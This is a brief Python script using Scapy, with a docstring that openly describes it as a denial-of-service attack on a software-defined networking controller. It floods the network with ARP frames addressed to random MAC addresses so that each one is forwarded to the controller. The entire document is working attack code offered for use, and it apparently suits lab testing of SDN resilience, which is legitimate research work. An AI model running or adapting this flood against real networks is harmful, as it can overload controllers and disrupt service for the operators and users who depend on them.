"""
Conduct a denial of service attack upon an SDN controller
by sending packets to many random destination MAC 
addresses. This likely will cause each packet to reach 
the controller (instead of being handled by switch rules), 
so the increased traffic may slow down or break the controller. 

"""
from scapy.all import *
src_mac = RandMAC()
for x in range(100):
    dst_mac = RandMAC()
    sendp(Ether(src=src_mac, dst=dst_mac)/ARP(op=2, psrc='0.0.0.0', hwdst='ff:ff:ff:ff:ff:ff')/Padding(load="X"*18))
